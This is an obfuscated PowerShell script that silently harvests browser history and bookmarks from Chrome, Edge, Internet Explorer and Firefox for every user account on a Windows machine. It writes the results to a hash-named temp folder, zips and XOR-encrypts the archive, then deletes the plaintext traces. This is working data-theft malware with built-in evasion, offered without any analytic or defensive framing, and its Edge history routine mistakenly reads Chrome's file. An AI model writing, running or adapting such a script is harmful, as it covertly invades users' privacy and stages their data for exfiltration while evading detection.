function GET-`B`RO`Ws`Er`DAta {
    [CmdletBinding()]
    Param
    (
        [Parameter(positIoN = 0)]
        [String[]]
        [ValidateSet({"{1}{0}{2}"-f("{0}{1}" -f'h','rom'),'C','e'},'IE',{"{1}{0}"-f 'Fox',{"{1}{0}"-f'ire','F'}}, 'All')]
        ${br`OWs`eR} = 'All',

        [Parameter(positIon = 1)]
        [String[]]
        [ValidateSet({"{1}{0}" -f ("{0}{1}" -f'to','ry'),'His'},{"{2}{1}{0}" -f 'rks','kma','Boo'},'All')]
        ${d`AtatYPE} = 'All',

        [Parameter(POsITion = 2)]
        [String]
        ${USe`RNa`mE} = '',

        [Parameter(pOSitIon = 3)]
        [String]
        ${SeA`R`cH} = ''
    )

    function cOnV`Er`T`FR`oM-`JSON20([object] ${it`em}){
        
        &("{1}{2}{0}"-f 'e',("{0}{1}" -f 'Add-T','y'),'p') -AssemblyName ("{5}{0}{1}{4}{3}{2}"-f '.','E','ons','si',("{1}{0}"-f'ten','x'),("{0}{1}{3}{2}" -f 'Sy','st','Web','em.'))
        ${PS_`Js} = &("{1}{0}{2}"-f ("{0}{2}{1}" -f 'ew','bjec','-O'),'N','t') ("{1}{6}{11}{5}{0}{3}{4}{7}{9}{10}{8}{2}"-f'n',("{0}{1}"-f'S','yst'),'r',("{0}{1}" -f '.Ja','v'),("{0}{2}{1}"-f'aSc','ip','r'),("{4}{2}{0}{3}{1}"-f 'li','tio','Script.Seria','za','eb.'),'em.',("{0}{1}" -f 'tSeri','a'),'ze','l','i','W')
        return ,${P`S`_js}.("{0}{2}{1}{3}{5}{4}" -f 'De','i','ser','ali',("{1}{0}" -f'ct','je'),("{0}{1}"-f'ze','Ob'))."inV`OKe"(${IT`eM})
        
    }

    function gEt-c`HR`OmE`H`iS`TORY {
        ${Pa`Th} = (("$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User "+'')+(("{1}{0}"-f 'a7c','Dat')+'4De'+("{0}{1}" -f'f','ault')+("{1}{0}"-f'c4H','7')+("{1}{0}"-f 'or','ist')+'y').("{2}{1}{0}" -f 'e','C',("{0}{1}" -f 'r','ePLA'))."I`N`VoKe"('7c4','\'))
        if (-not (&("{1}{0}" -f 'ath',("{1}{2}{0}"-f 'P','Te','st-')) -Path ${Pa`Th})) {
            &("{0}{2}{1}" -f 'Wr',("{0}{1}{2}"-f 'e-V','erbo','se'),'it') ('['+'!] '+("{1}{0}" -f 'ul','Co')+'d '+'n'+'ot '+'fi'+'nd '+'Chr'+'ome'+' '+("{1}{0}"-f'stor','Hi')+'y '+'f'+'or '+("{0}{1}"-f'u','sernam')+'e'+': '+"$UserName")
        }
        ${R`eG`EX} = ((("{10}{4}{5}{7}{1}{2}{3}{8}{9}{0}{6}" -f '/','/',("{1}{4}{0}{2}{3}" -f'2Ew.','([2Ew',')','+','w-]+'),((("{2}{1}{0}"-f 'w-]+(/','2Ew','['))),'t(',((("{1}{2}{0}"-f':','pwfRs)',')'))),((("{0}{2}{1}"-f '?%&=','*?',']*)'))),'/','[2E',("{0}{1}" -f 'ww-',' .'),'(ht'))-rEPLace '2Ew',[chaR]92 -crePlACE  ([chaR]119+[chaR]102+[chaR]82),[chaR]124)
        ${V`AlUe} = &("{2}{1}{0}"-f ("{0}{1}"-f'ten','t'),("{0}{1}"-f'-Co','n'),'Get') -Path (("$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User "+'')+((("{1}{0}"-f 'D','DataIrc')+("{1}{2}{3}{0}" -f'Hi','e','faultI','rc')+'st'+'or'+'y') -CrepLACE([CHaR]73+[CHaR]114+[CHaR]99),[CHaR]92))|&("{2}{1}{0}" -f ("{1}{0}"-f 'ring','t'),("{0}{1}" -f'ct-','S'),("{1}{0}" -f 'ele','S')) -AllMatches ${rE`gex} |&('%') {(${_}."m`ATc`hEs")."V`ALue"} |&("{1}{0}"-f 't','Sor') -Unique
        ${v`Al`UE} | &("{2}{0}{3}{1}" -f 'Ea',("{0}{1}"-f'je','ct'),'For',("{0}{1}" -f'c','h-Ob')) {
            ${K`EY} = ${_}
            if (${K`EY} -match ${seA`Rch}){
                &("{2}{1}{0}"-f("{2}{0}{1}" -f'je','ct','Ob'),'w-','Ne') -TypeName ("{1}{0}{2}"-f("{1}{0}"-f 'je','Ob'),'PS','ct') -Property @{
                    ("{1}{0}" -f 'r','Use') = ${U`S`eRNAme}
                    ("{2}{0}{1}" -f'ows','er','Br') = ("{0}{1}"-f'Chr','ome')
                    ("{1}{0}{2}"-f'ta','Da',("{0}{1}"-f 'Ty','pe')) = ("{0}{2}{1}" -f'Hi','y',("{1}{0}"-f 'tor','s'))
                    ("{1}{0}" -f'ata','D') = ${_}
                }
            }
        }        
    }

    function GET-E`DgEH`iS`TorY {
        ${P`ATH} = (("$Env:systemdrive\Users\$UserName\AppData\Local\Microsoft\Edge\User "+'')+(('Dat'+("{0}{2}{1}"-f'akVK','fa','De')+("{0}{1}"-f 'ul','tk')+'VK'+("{1}{0}"-f'st','Hi')+'o'+'ry')-ReplAcE'kVK',[cHaR]92))
        if (-not (&("{2}{1}{0}" -f 'ath',("{0}{1}" -f 's','t-P'),'Te') -Path ${p`AtH})) {
            &("{2}{3}{1}{0}" -f ("{0}{1}"-f 'Verbo','se'),'-','Wr','ite') ('[!]'+' '+("{1}{0}" -f'd','Coul')+' '+'n'+'ot '+'f'+("{1}{0}"-f' ','ind')+'Ed'+'ge '+("{1}{0}"-f 't','His')+("{1}{0}" -f' ','ory')+'for'+' '+'use'+("{1}{0}" -f'me:','rna')+' '+"$UserName")
        }
        ${R`EGeX} = ((("{12}{1}{7}{11}{0}{2}{9}{3}{5}{13}{6}{8}{4}{10}" -f '))','tt(',':/',("{0}{2}{1}"-f '[q','-]+','Jww'),'*',((("{0}{1}{2}{3}"-f 'q','Jw.)+[','q','Jww-'))),'./?',("{0}{1}"-f 'pc9','H'),("{0}{1}" -f '%&','=]'),'/(',')*?','s','(h',((("{2}{1}{0}"-f'qJww- ','+(/[',']')))))-repLACe 'qJw',[char]92-CRePLAcE([char]99+[char]57+[char]72),[char]124)
        ${V`Al`UE} = &("{3}{0}{1}{2}" -f ("{1}{0}{2}" -f'o','t-C','nte'),'n','t','Ge') -Path (("$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User "+'')+((("{0}{1}" -f'Dataf','v')+'CD'+'efa'+'ult'+("{1}{2}{0}"-f 'stor','fvCH','i')+'y')-cRePlaCE'fvC',[CHar]92))|&("{1}{3}{0}{2}" -f'Str','Sel','ing',("{0}{1}" -f 'ect','-')) -AllMatches ${RE`GEx} |&('%') {(${_}."Ma`TCH`Es")."val`UE"} |&("{1}{0}"-f 'rt','So') -Unique
        ${V`AL`UE} | &("{0}{4}{2}{3}{1}" -f 'Fo',("{0}{1}" -f'bje','ct'),'ach','-O','rE') {
            ${K`ey} = ${_}
            if (${k`EY} -match ${se`Ar`ch}){
                &("{2}{1}{3}{0}"-f("{0}{1}"-f'bj','ect'),'e','N','w-O') -TypeName ("{2}{0}{1}"-f 'b',("{0}{1}" -f 'jec','t'),'PSO') -Property @{
                    ("{0}{1}" -f 'U','ser') = ${usE`RN`AmE}
                    ("{2}{1}{0}"-f 'ser','row','B') = ("{1}{0}"-f'dge','E')
                    ("{0}{1}"-f 'Da',("{0}{1}" -f 'taTyp','e')) = ("{0}{1}" -f ("{1}{0}" -f 'tor','His'),'y')
                    ("{0}{1}" -f 'Dat','a') = ${_}
                }
            }
        }        
    }

    function G`Et`-CHRoME`B`oO`K`maRkS {
    ${P`ATH} = (("$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User "+'')+('D'+'a'+'ta{0}Def'+'ault{0}Bo'+'o'+'km'+'a'+'rks')-F[ChAR]92)
    if (-not (&("{1}{0}" -f("{1}{2}{0}" -f'ath','s','t-P'),'Te') -Path ${p`Ath})) {
        &("{1}{0}{3}{2}" -f ("{0}{1}"-f'it','e-Ve'),'Wr','se','rbo') ('[!]'+' '+'Co'+'uld'+' '+'n'+'ot '+("{0}{1}"-f 'fi','nd')+' '+'F'+'i'+("{1}{0}" -f 'Fox ','re')+'Bo'+("{1}{0}"-f 'arks','okm')+' '+'for'+' '+'us'+("{2}{0}{1}"-f'na','me','er')+': '+"$UserName")
    }   else {
            ${j`SON} = &("{0}{2}{3}{1}" -f 'G',("{1}{0}" -f'nt','Conte'),'e','t-') ${p`AtH}
            ${o`UTpUT} = &("{3}{0}{2}{1}"-f'o','20',("{1}{2}{0}"-f 'n','m-J','so'),("{0}{2}{1}" -f 'Conv','tFr','er'))(${j`Son})
            ${JS`oNOb`j`eCt} = ${oU`Tp`UT}."R`oOtS"."bo`okm`ARk_b`Ar"."ch`ilDr`eN"
            ${j`SONob`Je`cT}."U`Rl" |&("{0}{1}" -f'Sor','t') -Unique | &("{0}{2}{3}{1}" -f ("{1}{0}"-f 'orE','F'),("{0}{1}"-f 'bj','ect'),("{0}{1}"-f'ach','-'),'O') {
                if (${_} -match ${S`E`ArCH}) {
                    &("{0}{2}{1}" -f'Ne',("{1}{0}"-f 't','jec'),("{1}{0}" -f'-Ob','w')) -TypeName ("{2}{1}{0}" -f ("{0}{1}" -f 'b','ject'),'O','PS') -Property @{
                        ("{1}{0}"-f 'er','Us') = ${Us`Ern`AME}
                        ("{1}{2}{0}" -f'r',("{0}{1}"-f'Bro','ws'),'e') = ("{1}{0}" -f("{1}{0}"-f'e','hrom'),'C')
                        ("{1}{0}{2}" -f 'yp',("{0}{1}"-f 'Data','T'),'e') = ("{2}{0}{1}" -f("{0}{1}"-f 'o','okmar'),'k','B')
                        ("{0}{1}" -f 'Dat','a') = ${_}
                    }
                }
            }
        }
    }

    function G`e`T`-EdgEBo`OKmar`Ks {
    ${Pa`Th} = (("$Env:systemdrive\Users\$UserName\AppData\Local\Microsoft\Edge\User "+'')+('Dat'+("{1}{0}{2}"-f 'G','ad','hDefa')+("{1}{0}" -f'd','ult')+'GhB'+("{0}{1}"-f'oo','kma')+'rk'+'s')."rE`Pl`Ace"('dGh',[sTRing][ChAr]92))
    if (-not (&("{2}{3}{1}{0}" -f'h',("{0}{1}" -f 't-P','at'),'Te','s') -Path ${P`ATh})) {
        &("{2}{3}{0}{1}{4}"-f'Ve','rbo','Wr',("{0}{1}"-f 'i','te-'),'se') ('['+'!] '+("{0}{1}" -f'C','oul')+'d '+'not'+' '+'fin'+'d '+("{1}{0}"-f'F','Fire')+'o'+'x '+("{0}{1}"-f 'Boo','km')+'ark'+'s '+'f'+'or '+("{1}{0}" -f'er','us')+'nam'+'e: '+"$UserName")
    }   else {
            ${js`on} = &("{2}{1}{0}"-f("{0}{1}" -f 'nt','ent'),("{0}{1}"-f 't-C','o'),'Ge') ${p`ATH}
            ${OUTP`Ut} = &("{1}{5}{4}{3}{0}{2}" -f'n',("{2}{0}{1}" -f't','Fr','Conver'),'20',("{1}{0}" -f 'so','-J'),'m','o')(${JS`On})
            ${js`OnO`Bje`ct} = ${OUtp`UT}."rOO`Ts"."b`ookMa`RK_`BaR"."chiLdr`EN"
            ${jS`oN`o`BjeCt}."U`RL" |&("{0}{1}" -f'Sor','t') -Unique | &("{1}{3}{4}{0}{2}"-f("{0}{1}"-f 'c','h-O'),'F',("{0}{1}"-f'b','ject'),'orE','a') {
                if (${_} -match ${s`eaRch}) {
                    &("{1}{0}{2}" -f ("{0}{1}"-f'Obj','ec'),("{0}{1}" -f'Ne','w-'),'t') -TypeName ("{1}{2}{0}"-f 'ct','P',("{1}{0}"-f 'je','SOb')) -Property @{
                        ("{0}{1}" -f 'Use','r') = ${Us`erNa`Me}
                        ("{1}{0}"-f 'r',("{0}{1}" -f 'Brows','e')) = ("{0}{1}"-f'C',("{1}{0}" -f'e','hrom'))
                        ("{1}{2}{0}" -f 'pe','D',("{0}{1}" -f 'ataT','y')) = ("{0}{1}"-f ("{1}{0}"-f 'm','Book'),'ark')
                        ("{0}{1}"-f 'Dat','a') = ${_}
                    }
                }
            }
        }
    }

    function gE`T-iN`T`ER`NEtEXPlOrER`hIst`oRy {
        

        ${nu`ll} = &("{2}{0}{3}{1}" -f'-PS','ve','New','Dri') -Name ("{0}{1}"-f 'HK','U') -PSProvider ("{0}{2}{1}"-f 'Re','try','gis') -Root ("{3}{0}{2}{1}"-f'EY_','S',("{0}{1}" -f'USE','R'),'HK')
        ${PA`Ths} = &("{0}{2}{1}{3}"-f 'Get','e',("{1}{0}" -f'ildIt','-Ch'),'m') ((("{0}{2}{1}"-f 'H',':{0}','KU'))-f [char]92) -ErrorAction ("{4}{3}{5}{1}{0}{2}" -f 'Co','tly',("{0}{1}{2}"-f 'nt','inu','e'),'il','S','en') | &("{0}{2}{1}" -f("{0}{1}" -f'Wh','er'),("{1}{0}" -f 't','-Objec'),'e') { ${_}."Na`me" -match ((("{0}{1}{2}" -f'S','-1-5','-')+("{0}{1}"-f'21-[','0-9')+']'+'+-['+'0-'+'9'+']'+("{1}{0}"-f ']','+-[0-9')+'+-'+'[0'+'-9]'+'+{'+'0}')  -f [chAR]36) }

        ForEach(${p`ATh} in ${P`A`THs}) {

            ${u`seR} = ([System.Security.Principal.SecurityIdentifier] ${Pa`TH}."psCH`I`l`dnaMe")."TRAnSlA`Te"( [System.Security.Principal.NTAccount]) | &("{1}{0}" -f ("{0}{1}" -f'elec','t'),'S') -ExpandProperty ("{0}{1}" -f'V',("{1}{0}"-f'e','alu'))

            ${P`ATH} = ${P`Ath} | &("{0}{4}{2}{1}{3}" -f 'S',("{1}{0}"-f'ec','bj'),'-O','t',("{1}{0}"-f 'ect','el')) -ExpandProperty ("{0}{1}" -f'PS',("{0}{1}" -f'P','ath'))

            ${uSe`RPA`TH} = (("$Path\Software\Microsoft\Internet "+'')+(("{0}{1}" -f 'Expl','o')+("{0}{1}"-f 'rerc','w')+'3Ty'+("{0}{1}{2}"-f 'pedUR','L','s'))."re`PlaCe"(([CHAR]99+[CHAR]119+[CHAR]51),'\'))
            if (-not (&("{0}{1}"-f 'T',("{2}{1}{0}"-f 'th','Pa','est-')) -Path ${U`SerPa`TH})) {
                &("{0}{1}{2}"-f ("{0}{1}" -f 'W','rit'),("{0}{1}" -f'e-Verb','o'),'se') ('['+'!] '+("{0}{1}" -f 'Co','uld')+' '+'n'+'ot '+("{1}{0}" -f 'ind','f')+' '+'IE'+' '+'His'+'tor'+'y '+'fo'+'r '+'SID'+': '+"$Path")
            }
            else {
                &("{2}{1}{0}" -f 'm',("{1}{0}"-f 'te','t-I'),'Ge') -Path ${U`sE`R`pATH} -ErrorAction ("{1}{4}{3}{2}{0}" -f("{1}{0}" -f'nue','ti'),'S',("{0}{1}" -f 'n','tlyCon'),'e','il') | &("{0}{2}{3}{1}"-f'For','ct',("{1}{0}"-f'h-','Eac'),("{1}{0}" -f'e','Obj')) {
                    ${K`EY} = ${_}
                    ${k`EY}.("{1}{2}{0}" -f's','Get',("{0}{2}{1}" -f 'Val','Name','ue'))."Inv`OkE"() | &("{0}{2}{1}" -f("{1}{3}{2}{0}" -f'Each-Obje','F','r','o'),'t','c') {
                        ${vAL`Ue} = ${K`Ey}.("{2}{1}{0}" -f 'ue','al',("{1}{0}"-f'V','Get'))."i`NVo`ke"(${_})
                        if (${vA`lUE} -match ${sEa`RCh}) {
                            &("{1}{0}{2}" -f ("{0}{1}"-f'e','w-Obj'),'N','ect') -TypeName ("{1}{0}" -f'ct',("{0}{1}" -f 'PSOb','je')) -Property @{
                                ("{1}{0}"-f 'r','Use') = ${us`erN`AME}
                                ("{0}{1}{2}" -f ("{0}{1}"-f'B','rows'),'e','r') = 'IE'
                                ("{0}{2}{1}"-f 'D','e',("{0}{1}"-f 'ataTy','p')) = ("{0}{2}{1}" -f'Hi',("{1}{0}"-f 'ory','t'),'s')
                                ("{1}{0}" -f 'ta','Da') = ${va`L`UE}
                            }
                        }
                    }
                }
            }
        }
    }

    function Ge`T-INtE`RNET`e`XP`LorerbOoK`marKS {
        ${U`RLS} = &("{0}{3}{1}{4}{2}" -f ("{0}{1}" -f'Get','-'),'h',("{1}{0}"-f 'em','dIt'),'C','il') -Path "$Env:systemdrive\Users\" -Filter ("{0}{1}" -f '*.','url') -Recurse -ErrorAction ("{3}{0}{5}{2}{1}{4}" -f 'en','u','tin','Sil','e',("{1}{0}" -f'n','tlyCo'))
        ForEach (${U`RL} in ${UR`lS}) {
            if (${U`Rl}."F`ULLNA`me" -match ("{2}{0}{1}"-f 'a',("{2}{0}{1}" -f'te','s','vori'),'F')) {
                ${U`seR} = ${U`RL}."FUll`NA`Me".("{0}{1}" -f("{1}{0}" -f 'li','sp'),'t')."INVO`Ke"('\')[2]
                &("{2}{1}{0}" -f't',("{1}{0}" -f 'en','nt'),("{1}{0}"-f'et-Co','G')) -Path ${u`Rl}."FULl`Na`mE" | &("{3}{4}{2}{0}{1}" -f("{3}{1}{2}{0}" -f'c','O','bje','Each-'),'t','r','F','o') {
                    try {
                        if (${_}.("{2}{0}{1}" -f 'tar',("{1}{0}"-f'sWith','t'),'S')."I`NVOke"('URL')) {
                            
                            ${U`Rl} = ${_}.("{1}{0}{2}" -f ("{1}{0}" -f 'in','bstr'),'Su','g')."IN`V`oke"(${_}.("{1}{0}" -f("{0}{1}" -f 'ex','Of'),'Ind')."in`VOkE"('=') + 1)

                            if(${u`Rl} -match ${S`Ea`RCH}) {
                                &("{0}{2}{3}{1}" -f'N',("{1}{0}"-f 'ect','-Obj'),'e','w') -TypeName ("{1}{0}{2}"-f'Obj','PS','ect') -Property @{
                                    ("{0}{1}"-f'U','ser') = ${u`sER}
                                    ("{1}{0}{2}"-f 'ro','B',("{0}{1}"-f 'wse','r')) = 'IE'
                                    ("{1}{2}{0}"-f 'e','D',("{0}{2}{1}"-f 'a','p','taTy')) = ("{0}{1}{2}" -f'Boo','k',("{1}{0}"-f 'rk','ma'))
                                    ("{0}{1}" -f 'Dat','a') = ${u`Rl}
                                }
                            }
                        }
                    }
                    catch {
                        &("{3}{0}{1}{2}"-f("{1}{0}"-f'r','te-Ve'),'bos','e','Wri') ('E'+'rro'+'r '+'par'+'sin'+'g '+'ur'+'l: '+"$_")
                    }
                }
            }
        }
    }

    function geT-fI`R`E`Fo`X`HIS`ToRy {
        ${p`AtH} = "$Env:systemdrive\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\"
        if (-not (&("{1}{2}{0}"-f("{0}{1}"-f 'Pat','h'),("{1}{0}" -f 'st','Te'),'-') -Path ${pa`TH})) {
            &("{3}{1}{0}{2}{4}" -f'e',("{1}{0}" -f'-V','te'),("{1}{0}"-f 'os','rb'),'Wri','e') ('[!'+'] '+'C'+("{1}{0}"-f 'uld ','o')+'not'+' '+'fi'+'nd '+("{1}{0}" -f'e','Fir')+'F'+'ox '+("{0}{1}{2}" -f 'Hist','or','y')+' '+'f'+'or '+'us'+("{1}{0}" -f'ame','ern')+': '+"$UserName")
        }
        else {
            ${P`ROfI`L`Es} = &("{2}{1}{3}{0}{4}"-f'dI',("{1}{0}"-f't-C','e'),'G','hil','tem') -Path "$Path\*.default\" -ErrorAction ("{1}{2}{3}{0}" -f 'nue','Sil','ent',("{2}{0}{1}"-f'Co','nti','ly'))
            ${Re`G`eX} = ((("{0}{5}{3}{9}{8}{2}{1}{7}{6}{4}" -f ((("{0}{1}{2}" -f '(htt(p','P','i6'))),((("{1}{2}{0}{3}"-f '/[PfUw','PfUw-',']+(','-'))),')+[',((("{2}{0}{1}" -f '//','([',')):'))),((("{0}{1}"-f'%&','=]*)*?'))),'s','?',' ./','U.',("{3}{1}{0}{2}"-f 'P','-]+','f','PfUw')))."R`e`PlAce"(([cHAr]80+[cHAr]102+[cHAr]85),'\')."re`PL`Ace"(([cHAr]80+[cHAr]105+[cHAr]54),[StrINg][cHAr]124))
            ${V`A`lue} = &("{2}{0}{1}"-f("{0}{1}" -f'n','ten'),'t',("{0}{1}"-f'G','et-Co')) (("{6}{4}{5}{0}{2}{3}{7}{1}" -f 'pla','ite','c','e',("{2}{1}{0}" -f 'd','s','ofile'),'f0',("{0}{1}" -f'8R','jPr'),("{1}{0}"-f'sql','s.'))).("{1}{0}" -f 'e','Replac').Invoke('8Rj','$')."re`pL`Ace"(([chaR]100+[chaR]102+[chaR]48),'\') | &("{1}{0}{2}{3}" -f ("{1}{0}"-f'-','elect'),'S','St',("{1}{0}"-f'g','rin')) -Pattern ${rEG`ex} -AllMatches |&("{2}{3}{1}{0}"-f("{1}{0}"-f 'bject','-O'),'ct','S','ele') -ExpandProperty ("{1}{0}" -f("{0}{1}"-f 'c','hes'),'Mat') |&("{0}{1}" -f 'So','rt') -Unique
            ${v`AlUe}."val`UE" |&("{0}{2}{1}" -f 'F',("{0}{2}{1}"-f'-O','t','bjec'),("{1}{0}" -f 'ach','orE')) {
                if (${_} -match ${S`e`ARch}) {
                    &("{1}{2}{3}{0}" -f'ct',("{1}{0}{2}" -f'a','ForE','c'),'h-O','bje') {
                    &("{0}{2}{3}{1}" -f'Ne',("{0}{1}"-f'bj','ect'),'w','-O') -TypeName ("{1}{0}" -f 'ect',("{1}{0}"-f 'j','PSOb')) -Property @{
                        ("{0}{1}" -f'Use','r') = ${Us`e`RnaMe}
                        ("{1}{0}{2}" -f 'wse','Bro','r') = ("{1}{0}" -f 'x',("{1}{0}"-f'irefo','F'))
                        ("{2}{0}{1}" -f ("{0}{1}{2}"-f'a','ta','Typ'),'e','D') = ("{2}{1}{0}" -f 'ory','t','His')
                        ("{0}{1}"-f 'D','ata') = ${_}
                        }    
                    }
                }
            }
        }
    }

    if (!${u`s`E`RnamE}) {
        ${U`Se`RnaME} = "$ENV:USERNAME"
    }

    if((${bRO`W`Ser} -Contains 'All') -or (${bro`WsER} -Contains ("{0}{1}{2}"-f("{1}{0}" -f 'o','Chr'),'m','e'))) {
        if ((${dA`TAtypE} -Contains 'All') -or (${da`TATy`pe} -Contains ("{2}{0}{1}" -f 'o','ry',("{0}{1}"-f'H','ist')))) {
            &("{2}{3}{1}{4}{0}" -f'ory',("{2}{0}{1}"-f'eH','is','rom'),("{1}{0}"-f 't-','Ge'),'Ch','t')
        }
        if ((${d`A`TATYPe} -Contains 'All') -or (${DAtA`T`Y`PE} -Contains ("{0}{2}{1}" -f("{1}{0}"-f 'kma','Boo'),'s','rk'))) {
            &("{0}{2}{3}{1}{4}"-f 'Ge','k','t-',("{1}{3}{4}{0}{2}" -f'kma','Chr','r','omeBo','o'),'s')
        }
    }

    if((${Bro`ws`ER} -Contains 'All') -or (${bRow`s`er} -Contains 'IE')) {
        if ((${D`Ata`TYpe} -Contains 'All') -or (${Da`T`ATY`pe} -Contains ("{0}{2}{1}" -f'His','ory','t'))) {
            &("{6}{4}{5}{0}{3}{2}{1}" -f'pl',("{2}{0}{1}"-f 'or','y','Hist'),'er','or',("{0}{1}"-f't','ernetE'),'x',("{2}{0}{1}"-f 'et-','In','G'))
        }
        if ((${D`AtaTYpE} -Contains 'All') -or (${D`AtAT`ypE} -Contains ("{1}{2}{0}" -f 'ks',("{1}{0}" -f 'a','Bookm'),'r'))) {
            &("{3}{6}{0}{7}{1}{2}{5}{4}" -f'e','e','tE',("{1}{0}" -f 'n','Get-I'),'s',("{1}{2}{0}{3}{4}" -f'rer','x','plo','Bookma','rk'),'t','rn')
        }
    }

    if((${bRO`w`ser} -Contains 'All') -or (${b`ROWS`ER} -Contains ("{2}{1}{0}"-f'x','Fo',("{1}{0}" -f 'ire','F')))) {
        if ((${Da`TAtyPE} -Contains 'All') -or (${dAtA`T`yPe} -Contains ("{0}{1}"-f'His',("{0}{1}"-f't','ory')))) {
            &("{4}{3}{0}{1}{2}" -f("{0}{2}{1}"-f'F','oxHi','ireF'),'s',("{0}{1}" -f 'tor','y'),'t-','Ge')
        }
    }

    if((${B`ROw`seR} -Contains 'All') -or (${Br`OWs`er} -Contains ("{1}{0}"-f 'dge','E'))) {
        if ((${dA`TaT`Ype} -Contains 'All') -or (${da`T`AtYPE} -Contains ("{0}{1}{2}" -f'Hi','sto','ry'))) {
            &("{2}{3}{1}{4}{0}"-f("{0}{1}"-f's','tory'),'eH','Get',("{0}{1}" -f '-Ed','g'),'i')
        }
    }

    if((${B`ROws`ER} -Contains 'All') -or (${bR`owSEr} -Contains ("{1}{0}"-f 'e','Edg'))) {
        if ((${DaTA`TY`Pe} -Contains 'All') -or (${D`Ataty`Pe} -Contains ("{0}{2}{1}"-f 'H','y',("{0}{1}" -f'isto','r')))) {
            &("{1}{0}{2}" -f("{0}{1}{2}" -f 'e','t','-EdgeHi'),'G',("{0}{1}"-f'sto','ry'))
        }
        if ((${dA`TAtY`pe} -Contains 'All') -or (${dA`TATy`Pe} -Contains ("{0}{1}{2}" -f ("{0}{1}"-f 'Boo','kma'),'r','ks'))) {
            &("{3}{2}{0}{1}" -f 'kma','rks',("{0}{1}" -f 'EdgeB','oo'),("{1}{0}" -f '-','Get'))
        }
    }
}


$path = "$env:tmp\6d30b4e3442b4a5eef8dbc952a52cb3c"
if(!(test-path $path)) {
    New-Item -ItemType Directory -Force -Path $path
}
Get-ChildItem C:\Users | ForEach-Object {Get-BrowserData -UserName $_.Name -ErrorAction SilentlyContinue} | Export-Csv $path\BrowserHistory.csv -NoTypeInformation -Force

$sourceFolderPath = $path

$outputZipFilePath = "$env:tmp\6d30b4e3442b4a5eef8dbc952a52cb3c.zip"

$random = New-Object System.Random
$key = $random.Next(0, 256)

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($sourceFolderPath, $outputZipFilePath)

$zipBytes = [System.IO.File]::ReadAllBytes($outputZipFilePath)

for ($i = 0; $i -lt $zipBytes.Length; $i++) {
    $zipBytes[$i] = $zipBytes[$i] -bxor $key
}

$outputEncryptedFilePath = "$env:tmp\6d30b4e3442b4a5eef8dbc952a52cb3c_.zip"

$stream = [System.IO.File]::Create($outputEncryptedFilePath)
$stream.Write($key, 0, 1)
$stream.Write($zipBytes, 0, $zipBytes.Length)
$stream.Close()
Remove-Item -Path $sourceFolderPath -Recurse -Force
Get-ChildItem -Path $outputZipFilePath | Remove-Item -Force